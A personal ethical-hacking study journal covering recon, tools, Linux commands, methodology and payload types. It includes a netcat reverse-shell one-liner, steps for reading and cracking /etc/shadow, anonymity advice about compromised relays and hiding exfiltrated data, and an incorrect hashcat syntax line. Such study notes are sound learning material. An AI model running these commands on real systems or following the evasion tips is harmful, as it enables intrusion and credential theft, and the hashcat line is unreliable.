# Ethical Hacking Journal

This is a journal to keep track of overall progress and new topics I learn about Ethical Hacking / Hacking in general.

---

## 🧠 Key Concepts I’m Aware Of (But Might Need to Brush Up On)

---

### Reconnaissance

I'm aware that there are two different types: active and passive.

#### 🟠 Active Recon
- Actively interacting with the target
- Less hidden, more risk of being found out and making "noise"

#### 🟢 Passive Recon

**Physical / Social Recon** (not directly interacting with the target):
- Social media posts
- Uploaded company info
- Satellite images, drone recon, building layouts
- Badge readers, break areas, fencing, security patrols
- Employee names, job titles, phone numbers, managers
- Pictures of badges, desk setups, computers

**Web / Host Recon**:
- Target validation: `WHOIS`, `nslookup`, `dnsrecon`
- Subdomain discovery: Google Fu, `dig`, `Nmap`, `Sublist3r`, `Bluto`, `crt.sh`
- Fingerprinting: `Nmap`, Wappalyzer, WhatWeb, BuiltWith, `netcat`
- Data breaches: HaveIBeenPwned, etc.

> Again, check satellite images for physical testing. This will give you a great overview of the building.

**Google Hacking Tips**:
- `site:domain.com` – gather info about the site
- `-www` – helps find subdomains
- `filetype:` – search for specific file types exposed

---

### Enumeration

Enumeration is the act of digging deeper to:
- Identify active hosts
- Discover open ports
- Check available services on the network/system

Helps identify:
- Exploitable services
- Outdated versions
- Shared resources
- Config leaks

> Hacking is mostly just enumeration.

---

### Exploitation

This is when the fun happens:
- Try to exploit identified vulnerabilities to gain access or control of a system (e.g., employee computer or company network)

---

### Post-Exploitation

After exploitation, you:
- Maintain access ("Persistence")
- Try to escalate privileges (e.g., become admin)
- Gather more internal info

---

## 🧰 Tools

Some great tools to use during the process include:

- **Nmap**: Port scanning – find open ports and service types
- **Enum4Linux**: Gather info on Windows machines
- **Nessus / OpenVAS**: Vulnerability scanners
- **Nikto**: Scan for web server security issues
- **Metasploit Framework**: Exploitation and payload delivery
  - **Meterpreter**: Advanced post-exploitation payload
- **Burp Suite**: Web application testing
- **John the Ripper / Hashcat**: Password cracking

**Corporate Tools**:
- Nmap, Nessus, Burp Suite Pro, Cobalt Strike, BloodHound, Responder, Impacket, CrackMapExec

> **Use a VM workspace** like Kali Linux or Parrot OS. Never use your main operating system.

**More Info**:

- **Nmap**: Open ports and server information
- **Nessus**: Vulnerability scanning
- **Hydra**: Brute-force password cracker
- **Wireshark**: Network protocol analyzer
- **Burp Suite**: Proxy to intercept and analyze HTTP traffic
- **Responder**: Poison network protocols and capture authentication credentials
- **Hashcat**: Cracking hashes  
  - Syntax: `hashcat -m <hashfile> <path/to/passlist>`

---

## 📝 Reporting

This is the **most important part** of the methodology:
- Document all findings
- Explain how you found them
- Provide steps to reproduce and remediate
- Include every single detail with precision

---

## 💻 Environment

- Installed Kali Linux, familiar with Linux OS
- Installing tools: Burp Suite, NetScan, Hashcat, etc.
- Started learning about 1 year ago (on and off)
- Taking it seriously this time – hence the journal

---

## 🕶️ Staying Anonymous / Invisible

- Create burner accounts (no real-world ties)
- Avoid accessing illegal content without strong protection
- Use end-to-end encryption (Signal, Matrix)
- Avoid personally styled writing

**Tools & Methods**:
- VPN chains (different countries)
- Tor or I2P
- Compromised relays (pivot points)
- Burner SIMs & devices
- Tails OS / Whonix / Qubes OS
- Air-gapped systems (no internet)
- VMs for compartmentalization
- Wipe/reflash devices regularly

**Best Practices**:
- Never reuse usernames, passwords, handles
- Use temp email and crypto wallets
- Encrypt everything (disks, messages, exfiltrated data)
- Avoid behavior that draws attention (taunting, bragging online)

---

## 🧮 Linux Commands

```bash
ls        # list all content in a dir
cd        # switches dir
ls -la    # list hidden files
echo      # output content
mv        # moves a file
cp        # copies files
locate    # finds files you name
grep      # pulls out the line
cut       # cuts a line (-d specifies delimiter)

# Permissions
chmod +x         # add execute permission
chmod 777        # read, write, execute for all

# User Management
adduser          # adds user
cat /etc/passwd  # view users and UIDs
cat /etc/shadow  # view password hashes
su               # switch user

Permissions Format (ls -la):

    File/folder owner

    Group owner

    Others

    rw: read/write

    rwx: read/write/execute

    - = file, d = directory

🌐 Network Commands

ifconfig       # view network info
iwconfig       # for wireless hacking
ping           # test connectivity
arp -a         # list IP and MAC address pairs
netstat -ano   # show open ports and connections
route          # display routing info

⚙️ Installing Tools & Starting Services

apt-get install <tool>               # install tools
service apache2 start               # start Apache web server
service postgresql start            # start PostgreSQL
systemctl enable ssh                # enable SSH
systemctl enable postgresql         # start PostgreSQL at boot
python3 -m http.server 80           # start Python web server

📡 Protocols

    TCP: Connection-oriented, reliable (used in apps needing guaranteed delivery)

    UDP: Connectionless, faster, but less reliable (used in video/audio streaming)

Stealth Scan (TCP 3-way Handshake):

    SYN → SYN-ACK → RST (avoids full connection)

📋 Methodology

    Start with a network scan using nmap to find open ports

    Test open ports:

        Visit web ports (443, 80)

        Analyze for info leaks (e.g., server version, Apache/Redhat)

    View source code for comments and leaks

    Use nikto for server enumeration

    Use dirbuster to brute-force subdirectories

    Look for headers exposing server info (info disclosure)

Post-Exploitation Enumeration

    Use arp -a, netstat, route

    Use sudo -l to check privilege levels

    Access /etc/shadow and /etc/passwd

    Use unshadow to combine files and crack with john or hashcat

🐚 Shells
Reverse Shell

# On your machine:
nc -lvp <PORT>

# On target:
nc <YOUR_IP> <PORT> -e /bin/bash

Bind Shell

    Target opens a port

    You connect to it directly

    You can establish a shell by exploiting a vulnerability, sending a payload via Metasploit, and connecting back to the listener.

💣 Payloads
Non-Staged Payloads

    Entire shellcode sent at once

    Larger and more reliable

    Example: windows/meterpreter_reverse_tcp

Staged Payloads

    Sent in parts/stages

    Smaller footprint but less stable

    Example: windows/meterpreter/reverse_tcp

🔐 Credential Stuffing

    Using known cleartext passwords against login forms

    Simple but often effective

🪪 Token Impersonation

    Move through systems without revealing your own credentials

    Use the token of a verified user/admin

    Often done via Meterpreter shell

🧪 LLMNR Poisoning

    (To be expanded – placeholder for techniques using Responder or similar tools)
